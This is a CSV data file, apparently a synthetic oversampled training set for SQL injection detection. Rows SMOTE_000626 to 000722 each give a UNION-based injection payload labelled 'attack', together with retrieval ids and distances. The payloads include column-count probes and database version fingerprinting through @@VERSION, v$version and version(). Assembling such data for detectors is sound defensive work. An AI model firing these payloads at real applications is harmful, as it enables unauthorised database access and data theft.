id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000626,attack,union,"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",nearest_attack_euclidean,R000089,0.31401396332895426
SMOTE_000627,attack,union,"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",nearest_attack_euclidean,R000048,0.4132676915377725
SMOTE_000628,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000153,0.21715361635728808
SMOTE_000629,attack,union," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000006,0.6697395135194574
SMOTE_000630,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000113,0.504632872340291
SMOTE_000631,attack,union,"-3593%' union all select 6346,6346,6346,6346,6346,6346--",nearest_attack_euclidean,R000061,0.38105190743470824
SMOTE_000632,attack,union," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000010,1.1558194437761713
SMOTE_000633,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000103,0.13029489934118116
SMOTE_000634,attack,union,"-4015'||  (  select 'qeqv' from dual where 1437  =  1437 union all select 1437,1437,1437,1437,1437,1437,1437,1437,1437#",nearest_attack_euclidean,R000122,0.6128054818352278
SMOTE_000635,attack,union,"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",nearest_attack_euclidean,R000125,0.27764421165766473
SMOTE_000636,attack,union,"-7637"" union all select 8498,8498,8498--",nearest_attack_euclidean,R000124,0.4357043601202508
SMOTE_000637,attack,union,"-8677'||  (  select 'ihpm' from dual where 9571  =  9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",nearest_attack_euclidean,R000128,1.130743788175878
SMOTE_000638,attack,union,"-2766%'   )    )    union all select 4458,4458,4458,4458,4458--",nearest_attack_euclidean,R000080,0.3804875264698766
SMOTE_000639,attack,union,"-3068%""   )    )    union all select 6597,6597,6597,6597,6597,6597,6597,6597--",nearest_attack_euclidean,R000114,0.990291317379178
SMOTE_000640,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000084,0.1157979373491044
SMOTE_000641,attack,union,"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",nearest_attack_euclidean,R000048,0.7721694726772408
SMOTE_000642,attack,union,"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",nearest_attack_euclidean,R000097,0.13138786062212182
SMOTE_000643,attack,union,"-1876'||  (  select 'itfc' from dual where 9584  =  9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",nearest_attack_euclidean,R000134,0.46489436040212556
SMOTE_000644,attack,union,"-7501'+  (  select uloc where 3089  =  3089 union all select 3089,3089,3089,3089,3089,3089,3089,3089,3089,3089--",nearest_attack_euclidean,R000053,0.79651732040914
SMOTE_000645,attack,union,"-4694%""   )    )     )   union all select 9178,9178,9178,9178,9178--",nearest_attack_euclidean,R000109,0.3378116600420715
SMOTE_000646,attack,union,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",nearest_attack_euclidean,R000127,0.357260629263895
SMOTE_000647,attack,union,"-2643%"" union all select 7779,7779--",nearest_attack_euclidean,R000099,1.2093663148459495
SMOTE_000648,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,0.044909876479188794
SMOTE_000649,attack,union,"-3595'+  (  select vppx where 6018  =  6018 union all select 6018,6018,6018,6018,6018#",nearest_attack_euclidean,R000047,0.8060152278288352
SMOTE_000650,attack,union,"-2364'+  (  select 'qdut' where 7560  =  7560 union all select 7560,7560,7560,7560,7560--",nearest_attack_euclidean,R000149,0.5055695064769234
SMOTE_000651,attack,union,"-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",nearest_attack_euclidean,R000147,0.2888560095628508
SMOTE_000652,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000025,0.038775020774306404
SMOTE_000653,attack,union," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000026,2.2244995869918487
SMOTE_000654,attack,union,"-3343'||  (  select 'ssvt' where 5179  =  5179 union all select 5179,5179,5179,5179,5179,5179,5179,5179--",nearest_attack_euclidean,R000083,0.11916668880017803
SMOTE_000655,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000021,0.7439360481810103
SMOTE_000656,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000116,1.0669189579153604
SMOTE_000657,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000092,10.798978220068696
SMOTE_000658,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000116,0.06143918953168256
SMOTE_000659,attack,union,"-3595'+  (  select vppx where 6018  =  6018 union all select 6018,6018,6018,6018,6018#",nearest_attack_euclidean,R000047,1.074702740842792
SMOTE_000660,attack,union,"-8677'||  (  select 'ihpm' from dual where 9571  =  9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",nearest_attack_euclidean,R000128,0.4790431124067555
SMOTE_000661,attack,union,"-1150'  )   as hdby where 4032  =  4032 union all select 4032,4032,4032,4032,4032,4032,4032,4032,4032,4032--",nearest_attack_euclidean,R000094,0.39421229868382207
SMOTE_000662,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000121,0.5438855824721296
SMOTE_000663,attack,union,"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",nearest_attack_euclidean,R000042,0.052919217475943976
SMOTE_000664,attack,union,"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",nearest_attack_euclidean,R000072,0.20334231563019917
SMOTE_000665,attack,union," select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000023,1.5718131055243616
SMOTE_000666,attack,union,"-7088'||  (  select 'arol' from dual where 8891  =  8891 union all select 8891,8891,8891,8891,8891,8891,8891,8891#",nearest_attack_euclidean,R000078,0.15874031940139446
SMOTE_000667,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000040,0.6003807783771832
SMOTE_000668,attack,union,"-5322"" union all select 6494,6494,6494,6494,6494,6494--",nearest_attack_euclidean,R000104,0.1457425890923611
SMOTE_000669,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000040,0.7097715977083621
SMOTE_000670,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000039,0.34800069959623764
SMOTE_000671,attack,union,"-3581'||  (  select 'uxmh' from dual where 8954  =  8954 union all select 8954,8954,8954,8954,8954,8954#",nearest_attack_euclidean,R000111,0.2651192516653401
SMOTE_000672,attack,union,"-6186' in boolean mode  )   union all select 2990,2990,2990#",nearest_attack_euclidean,R000132,0.41993250132081267
SMOTE_000673,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000108,0.5229852511498337
SMOTE_000674,attack,union,"-8612'+  (  select 'iqla' where 5035  =  5035 union all select 5035,5035,5035,5035,5035,5035,5035#",nearest_attack_euclidean,R000155,0.8101418961547119
SMOTE_000675,attack,union,"-6086"" union all select 8700,8700,8700,8700--",nearest_attack_euclidean,R000093,0.22398464722482425
SMOTE_000676,attack,union,"-6186' in boolean mode  )   union all select 2990,2990,2990#",nearest_attack_euclidean,R000132,0.5528855910765637
SMOTE_000677,attack,union,"-5866'   )    )    as phzq where 3803  =  3803 union all select 3803,3803,3803,3803,3803,3803,3803,3803--",nearest_attack_euclidean,R000075,0.24973544453396448
SMOTE_000678,attack,union,"-2643%"" union all select 7779,7779--",nearest_attack_euclidean,R000099,0.844214293407951
SMOTE_000679,attack,union," select * from users where id  =  '1' union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000033,1.5941268673798725
SMOTE_000680,attack,union,"-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--",nearest_attack_euclidean,R000112,0.16185672716786464
SMOTE_000681,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000150,0.5423981706326684
SMOTE_000682,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000087,0.1297397565017916
SMOTE_000683,attack,union,"-1876'||  (  select 'itfc' from dual where 9584  =  9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",nearest_attack_euclidean,R000134,0.5513429802420169
SMOTE_000684,attack,union," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000010,1.2300433364982446
SMOTE_000685,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000084,0.33463925876055634
SMOTE_000686,attack,union,"-8929' union all select 5324,5324,5324,5324,5324,5324--",nearest_attack_euclidean,R000115,0.2188983801903797
SMOTE_000687,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000096,0.27420913371284605
SMOTE_000688,attack,union," select * from users where id  =  1 or 1#""  (   union select null,version  (    )   -- 1",nearest_attack_euclidean,R000034,0.8410942618088921
SMOTE_000689,attack,union,"-3638"" union all select 4394,4394,4394,4394,4394,4394,4394--",nearest_attack_euclidean,R000085,0.14420289942583078
SMOTE_000690,attack,union,"-1236'+  (  select 'fbgh' where 3896  =  3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896--",nearest_attack_euclidean,R000051,0.04361399160999579
SMOTE_000691,attack,union,"-7078'||  (  select 'lcza' where 5076  =  5076 union all select 5076,5076,5076,5076,5076,5076,5076,5076,5076,5076--",nearest_attack_euclidean,R000077,0.005944299375004128
SMOTE_000692,attack,union," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000026,0.25562129806219314
SMOTE_000693,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000021,0.323175596288462
SMOTE_000694,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000037,2.1746085810946636
SMOTE_000695,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000009,1.301903253518682
SMOTE_000696,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000055,0.053451949171949016
SMOTE_000697,attack,union,"-3595'+  (  select vppx where 6018  =  6018 union all select 6018,6018,6018,6018,6018#",nearest_attack_euclidean,R000047,1.2141999116199915
SMOTE_000698,attack,union,"-3638"" union all select 4394,4394,4394,4394,4394,4394,4394--",nearest_attack_euclidean,R000085,0.2380162626839766
SMOTE_000699,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R000069,0.06864204120312474
SMOTE_000700,attack,union,"-2766%'   )    )    union all select 4458,4458,4458,4458,4458--",nearest_attack_euclidean,R000080,0.2399483403293689
SMOTE_000701,attack,union,"-1236'+  (  select 'fbgh' where 3896  =  3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896--",nearest_attack_euclidean,R000051,0.28528718258721397
SMOTE_000702,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000084,0.08067343355263613
SMOTE_000703,attack,union,"-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--",nearest_attack_euclidean,R000095,0.8181209093485424
SMOTE_000704,attack,union,"-3250%"" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162--",nearest_attack_euclidean,R000119,0.21044398700854847
SMOTE_000705,attack,union,"-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--",nearest_attack_euclidean,R000112,0.4909109455439591
SMOTE_000706,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000040,0.33492905825661906
SMOTE_000707,attack,union," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000019,0.8804428634278677
SMOTE_000708,attack,union,"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",nearest_attack_euclidean,R000048,0.3597312517000806
SMOTE_000709,attack,union,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",nearest_attack_euclidean,R000127,0.3730708023321638
SMOTE_000710,attack,union,"-8677'||  (  select 'ihpm' from dual where 9571  =  9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",nearest_attack_euclidean,R000128,0.5707939851039834
SMOTE_000711,attack,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",nearest_attack_euclidean,R000054,0.03954520975941087
SMOTE_000712,attack,union," select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000012,0.2372925361553512
SMOTE_000713,attack,union," select * from users where id  =  '1' *1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000035,0.3215033105867053
SMOTE_000714,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000037,0.6725134972679175
SMOTE_000715,attack,union,"-6789'||  (  select 'uckz' from dual where 2163  =  2163 union all select 2163,2163,2163,2163,2163,2163--",nearest_attack_euclidean,R000066,0.11912097989343838
SMOTE_000716,attack,union,"-2643%"" union all select 7779,7779--",nearest_attack_euclidean,R000099,1.3216969784987513
SMOTE_000717,attack,union,"-3361'||  (  select 'msfi' where 4806  =  4806 union all select 4806,4806,4806,4806,4806,4806,4806,4806,4806--",nearest_attack_euclidean,R000102,0.39685178081858513
SMOTE_000718,attack,union,"-3667%'   )    )    union all select 3560,3560,3560--",nearest_attack_euclidean,R000107,1.2570385380062956
SMOTE_000719,attack,union,"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",nearest_attack_euclidean,R000072,0.09326689538533792
SMOTE_000720,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000001,1.6858739404357614e-07
SMOTE_000721,attack,union,"-5516'+  (  select 'bmlv' where 7188  =  7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#",nearest_attack_euclidean,R000154,0.5272834649425117
SMOTE_000722,attack,union,-6912' in boolean mode  )   union all select 6012--,nearest_attack_euclidean,R000141,0.8421428685594428
